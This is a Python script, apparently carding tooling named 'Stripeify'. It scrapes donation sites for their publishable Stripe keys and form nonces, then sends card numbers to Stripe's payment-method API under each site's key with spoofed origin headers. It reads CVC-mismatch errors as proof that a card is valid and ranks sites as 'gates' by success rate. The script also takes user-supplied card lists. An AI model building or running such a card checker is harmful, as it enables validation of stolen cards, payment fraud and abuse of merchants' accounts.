#!/usr/bin/env python3
"""
Gate Tester - Tests donation gates with sample cards
Ranks gates by success rate and reliability
"""

import requests
import json
import time
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.panel import Panel
from rich import box
from typing import Dict, List, Tuple
import re

console = Console()

# Test cards (these are standard test cards that will be declined)
TEST_CARDS = [
    "4532015112830366|12|2027|123",  # Visa test card
    "5425233430109903|11|2026|456",  # Mastercard test card
    "4111111111111111|10|2025|789",  # Visa test card
]

# Theme colors
THEME = {
    'primary': '#A78BFA',
    'secondary': '#60A5FA',
    'success': '#34D399',
    'warning': '#FBBF24',
    'error': '#F87171',
}


def load_donation_gates(file_path: str = 'donation_gates.json') -> List[Dict]:
    """Load analyzed donation gates from JSON"""
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        console.print(f"[red]✗ File not found: {file_path}[/red]")
        console.print("[yellow]Run gate_analyzer.py first to generate donation_gates.json[/yellow]")
        return []
    except Exception as e:
        console.print(f"[red]✗ Error loading gates: {e}[/red]")
        return []


def fetch_gate_details(gate: Dict) -> Tuple[str, str, str]:
    """
    Fetch nonce, form ID, and other details from donation page
    Returns (nonce, form_id, submit_url)
    """
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }
        
        response = requests.get(gate['url'], headers=headers, timeout=10)
        
        if response.status_code != 200:
            return None, None, None
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Try to find nonce field (common names)
        nonce = None
        nonce_fields = ['_wpnonce', 'nonce', '_token', 'csrf_token', 'authenticity_token']
        for field_name in nonce_fields:
            nonce_input = soup.find('input', {'name': field_name})
            if nonce_input and nonce_input.get('value'):
                nonce = nonce_input['value']
                break
        
        # Try to find form ID
        form_id = None
        form_id_input = soup.find('input', {'name': re.compile(r'form.*id', re.I)})
        if form_id_input and form_id_input.get('value'):
            form_id = form_id_input['value']
        
        # Try to find submit URL
        submit_url = gate['url']
        form = soup.find('form')
        if form and form.get('action'):
            action = form['action']
            if action.startswith('http'):
                submit_url = action
            elif action.startswith('/'):
                from urllib.parse import urlparse
                parsed = urlparse(gate['url'])
                submit_url = f"{parsed.scheme}://{parsed.netloc}{action}"
        
        return nonce, form_id, submit_url
        
    except Exception as e:
        return None, None, None


def test_card_on_gate(card_data: str, gate: Dict) -> Dict:
    """
    Test a single card on a Shopify donation gate
    Returns result dict with status and details
    """
    result = {
        'gate_url': gate['url'],
        'card': card_data,
        'success': False,
        'status': 'ERROR',
        'message': 'Unknown error',
        'response_time': 0,
        'payment_error': None
    }
    
    start_time = time.time()
    
    try:
        n, mm, yy, cvc = card_data.split('|')
        yy = yy[-2:]
        
        # Check if gate has Shopify
        if not gate.get('has_shopify'):
            result['message'] = 'Not a Shopify site'
            return result
        
        # Determine payment gateway
        payment_gateway = gate.get('payment_gateway', 'Unknown')
        
        # Step 1: Test based on payment gateway
        if 'Stripe' in payment_gateway:
            # Shopify + Stripe integration
            return test_shopify_stripe_gate(card_data, gate, result, start_time)
        elif 'Shopify Payments' in payment_gateway:
            # Native Shopify Payments
            return test_shopify_payments_gate(card_data, gate, result, start_time)
        else:
            # Unknown gateway - try generic Shopify checkout
            return test_generic_shopify_gate(card_data, gate, result, start_time)
            
    except Exception as e:
        result['message'] = str(e)[:100]
        result['response_time'] = time.time() - start_time
        return result


def test_shopify_stripe_gate(card_data: str, gate: Dict, result: Dict, start_time: float) -> Dict:
    """Test Shopify site using Stripe integration"""
    try:
        n, mm, yy, cvc = card_data.split('|')
        yy = yy[-2:]
        
        # Try to find Stripe key from page
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }
        
        page_response = requests.get(gate['url'], headers=headers, timeout=10)
        stripe_key_match = re.search(r'pk_(live|test)_[a-zA-Z0-9]+', page_response.text)
        
        if not stripe_key_match:
            result['message'] = 'No Stripe key found on page'
            result['status'] = 'GATE_ERROR'
            return result
        
        stripe_key = stripe_key_match.group(0)
        
        # Create Stripe Payment Method
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': gate['url'],
            'referer': gate['url'],
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }
        
        stripe_data = (
            f"type=card"
            f"&billing_details[name]=Test User"
            f"&billing_details[email]=test@example.com"
            f"&card[number]={n}"
            f"&card[cvc]={cvc}"
            f"&card[exp_month]={mm}"
            f"&card[exp_year]={yy}"
            f"&key={stripe_key}"
        )
        
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data,
            timeout=15
        )
        
        result['response_time'] = time.time() - start_time
        
        if pm_response.status_code != 200:
            result['message'] = f"Stripe API error: HTTP {pm_response.status_code}"
            return result
        
        pm_data = pm_response.json()
        
        if 'error' in pm_data:
            error_msg = pm_data['error'].get('message', 'Unknown error')
            result['payment_error'] = error_msg
            result['status'] = 'DECLINED'
            result['message'] = error_msg
            
            # Check if it's a CVV error (indicates card format is valid)
            if 'cvc' in error_msg.lower() or 'security code' in error_msg.lower():
                result['success'] = True
                result['status'] = 'CVV_MISMATCH'
                result['message'] = 'Card valid - CVV mismatch (Shopify+Stripe)'
            
            return result
        
        if 'id' in pm_data:
            result['success'] = True
            result['status'] = 'PAYMENT_METHOD_CREATED'
            result['message'] = 'Shopify+Stripe payment method created'
            result['response_time'] = time.time() - start_time
        
        return result
        
    except Exception as e:
        result['message'] = str(e)[:100]
        result['response_time'] = time.time() - start_time
        return result


def test_shopify_payments_gate(card_data: str, gate: Dict, result: Dict, start_time: float) -> Dict:
    """Test Shopify site using native Shopify Payments"""
    try:
        n, mm, yy, cvc = card_data.split('|')
        yy = yy[-2:]
        
        # For Shopify Payments, we need to access the checkout
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
        
        # Try to create a checkout session
        # This is a simplified test - real implementation would need product IDs
        result['status'] = 'SHOPIFY_PAYMENTS_DETECTED'
        result['message'] = 'Shopify Payments detected (full test requires product)'
        result['success'] = True  # Mark as success if we can detect it
        result['response_time'] = time.time() - start_time
        
        return result
        
    except Exception as e:
        result['message'] = str(e)[:100]
        result['response_time'] = time.time() - start_time
        return result


def test_generic_shopify_gate(card_data: str, gate: Dict, result: Dict, start_time: float) -> Dict:
    """Test generic Shopify site (unknown payment gateway)"""
    try:
        # Check if site is accessible and has Shopify
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
        }
        
        response = requests.get(gate['url'], headers=headers, timeout=10)
        
        if response.status_code == 200:
            if 'shopify' in response.text.lower():
                result['status'] = 'SHOPIFY_DETECTED'
                result['message'] = 'Shopify site confirmed (payment gateway unknown)'
                result['success'] = True
                result['response_time'] = time.time() - start_time
            else:
                result['message'] = 'Not a Shopify site'
                result['status'] = 'NOT_SHOPIFY'
        else:
            result['message'] = f'HTTP {response.status_code}'
            result['status'] = 'INACCESSIBLE'
        
        return result
        
    except Exception as e:
        result['message'] = str(e)[:100]
        result['response_time'] = time.time() - start_time
        return result


def test_gate(gate: Dict, test_cards: List[str]) -> Dict:
    """
    Test a gate with multiple cards
    Returns gate performance metrics
    """
    results = {
        'gate': gate,
        'total_tests': len(test_cards),
        'successful_tests': 0,
        'failed_tests': 0,
        'avg_response_time': 0,
        'test_results': [],
        'reliability_score': 0
    }
    
    total_time = 0
    
    for card in test_cards:
        result = test_card_on_gate(card, gate)
        results['test_results'].append(result)
        
        if result['success']:
            results['successful_tests'] += 1
        else:
            results['failed_tests'] += 1
        
        total_time += result['response_time']
        
        time.sleep(2)  # Delay between tests
    
    # Calculate metrics
    if results['total_tests'] > 0:
        results['avg_response_time'] = total_time / results['total_tests']
        results['reliability_score'] = (results['successful_tests'] / results['total_tests']) * 100
    
    return results


def display_test_results(all_results: List[Dict]):
    """Display test results in a nice table"""
    
    if not all_results:
        console.print("\n[red]❌ No test results to display[/red]")
        return
    
    # Sort by reliability score
    all_results.sort(key=lambda x: x['reliability_score'], reverse=True)
    
    console.print(f"\n[bold green]✅ Gate Testing Complete[/bold green]\n")
    
    # Summary table
    table = Table(title="🎯 Gate Performance Rankings", box=box.DOUBLE, show_lines=True)
    table.add_column("Rank", style="cyan", width=6)
    table.add_column("Gate URL", style="blue", width=35)
    table.add_column("Success Rate", style="green", width=12)
    table.add_column("Avg Time", style="yellow", width=10)
    table.add_column("Tests", style="magenta", width=8)
    table.add_column("Score", style="cyan", width=8)
    
    for i, result in enumerate(all_results, 1):
        gate_url = result['gate']['url'][:35]
        success_rate = f"{result['reliability_score']:.1f}%"
        avg_time = f"{result['avg_response_time']:.2f}s"
        tests = f"{result['successful_tests']}/{result['total_tests']}"
        score = f"{result['reliability_score']:.0f}"
        
        # Color code based on success rate
        if result['reliability_score'] >= 80:
            rank_style = "bold green"
        elif result['reliability_score'] >= 50:
            rank_style = "yellow"
        else:
            rank_style = "red"
        
        table.add_row(
            f"[{rank_style}]{i}[/{rank_style}]",
            gate_url,
            success_rate,
            avg_time,
            tests,
            score
        )
    
    console.print(table)
    
    # Best gates
    console.print("\n[bold cyan]🏆 Top 5 Recommended Gates:[/bold cyan]")
    for i, result in enumerate(all_results[:5], 1):
        console.print(f"\n  {i}. [blue]{result['gate']['url']}[/blue]")
        console.print(f"     Title: {result['gate'].get('title', 'N/A')}")
        console.print(f"     Success Rate: [green]{result['reliability_score']:.1f}%[/green]")
        console.print(f"     Avg Response: [yellow]{result['avg_response_time']:.2f}s[/yellow]")
        if result['gate'].get('stripe_key'):
            console.print(f"     Stripe Key: [dim]{result['gate']['stripe_key'][:20]}...[/dim]")


def save_test_results(results: List[Dict], output_file: str = 'gate_test_results.json'):
    """Save test results to JSON"""
    try:
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        console.print(f"\n[green]✓ Test results saved to {output_file}[/green]")
    except Exception as e:
        console.print(f"\n[red]✗ Error saving results: {e}[/red]")


def main():
    """Main function"""
    console.print("""
[bold cyan]╔═══════════════════════════════════════════════════════════╗
║         Stripeify - Donation Gate Tester                  ║
║         Tests donation gates with sample cards            ║
╚═══════════════════════════════════════════════════════════╝[/bold cyan]
    """)
    
    # Load donation gates
    console.print("[yellow]Loading donation gates...[/yellow]")
    gates = load_donation_gates('/home/null/Desktop/Stripeify/donation_gates.json')
    
    if not gates:
        console.print("[red]No gates to test. Run gate_analyzer.py first.[/red]")
        return
    
    console.print(f"[green]✓ Loaded {len(gates)} donation gates[/green]\n")
    
    # Ask how many to test
    try:
        max_test = int(console.input(f"[cyan]How many gates to test? (max {len(gates)}): [/]") or str(len(gates)))
        max_test = min(max_test, len(gates))
    except:
        max_test = len(gates)
    
    # Ask about test cards
    use_custom = console.input("[cyan]Use custom test cards? (y/n, default: n): [/]").lower()
    
    if use_custom == 'y':
        console.print("[yellow]Enter test cards (format: number|month|year|cvv), one per line.[/yellow]")
        console.print("[yellow]Press Enter twice when done:[/yellow]")
        test_cards = []
        while True:
            card = console.input("Card: ").strip()
            if not card:
                break
            test_cards.append(card)
        
        if not test_cards:
            test_cards = TEST_CARDS
    else:
        test_cards = TEST_CARDS
    
    console.print(f"\n[green]✓ Using {len(test_cards)} test cards[/green]\n")
    
    # Test gates
    console.print(f"[bold yellow]🧪 Testing {max_test} gates with {len(test_cards)} cards each...[/bold yellow]\n")
    
    all_results = []
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        
        task = progress.add_task("[cyan]Testing gates...", total=max_test)
        
        for i, gate in enumerate(gates[:max_test], 1):
            progress.update(
                task, 
                advance=1, 
                description=f"[cyan]Testing gate {i}/{max_test}: {gate['url'][:40]}..."
            )
            
            result = test_gate(gate, test_cards)
            all_results.append(result)
            
            time.sleep(3)  # Delay between gates
    
    # Display results
    display_test_results(all_results)
    
    # Save results
    save_test_results(all_results, '/home/null/Desktop/Stripeify/gate_test_results.json')
    
    # Summary
    console.print("\n[bold cyan]📊 Testing Summary:[/bold cyan]")
    total_tests = sum(r['total_tests'] for r in all_results)
    total_success = sum(r['successful_tests'] for r in all_results)
    overall_success_rate = (total_success / total_tests * 100) if total_tests > 0 else 0
    
    console.print(f"  Total Gates Tested: {len(all_results)}")
    console.print(f"  Total Card Tests: {total_tests}")
    console.print(f"  Successful Tests: {total_success}")
    console.print(f"  Overall Success Rate: [green]{overall_success_rate:.1f}%[/green]")
    
    # Recommendations
    high_quality_gates = [r for r in all_results if r['reliability_score'] >= 80]
    if high_quality_gates:
        console.print(f"\n[bold green]✅ Found {len(high_quality_gates)} high-quality gates (≥80% success rate)[/bold green]")
        console.print("[green]These gates are recommended for use in MadyOriginal[/green]")
    else:
        console.print("\n[yellow]⚠️  No gates with ≥80% success rate found[/yellow]")
        console.print("[yellow]Consider testing more gates or using different test cards[/yellow]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n\n[yellow]⚠️  Testing interrupted by user[/yellow]")
    except Exception as e:
        console.print(f"\n\n[red]💥 Error: {e}[/red]")
